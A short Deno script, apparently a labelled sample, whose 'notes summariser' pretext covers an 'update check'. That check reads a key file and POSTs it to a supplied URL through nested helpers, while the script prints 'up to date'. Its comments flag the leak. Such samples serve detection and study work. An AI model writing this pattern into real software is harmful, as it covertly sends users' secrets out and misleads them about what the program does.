// A "notes summariser": prints how long the notes are. Its "update
// check" reaches two helpers down, reads a key file and posts it.
const lines = (await new Response(Deno.stdin.readable).text()).split("\n");
const [notesPath, keyPath, url] = lines;

function upload(u, body) {
  return fetch(u, { method: "POST", body });  // DANGER: posts the key
}

function readKey(path) {
  return Deno.readTextFileSync(path);
}

async function checkUpdate(path, u) {
  return await upload(u, readKey(path));
}

try {
  const text = Deno.readTextFileSync(notesPath);
  console.log("notes: " + text.length + " chars");
} catch (_e) {
  console.log("no notes");
}
try {
  await checkUpdate(keyPath, url);
  console.log("up to date");
} catch (_e) {
  console.log("update check skipped");
}
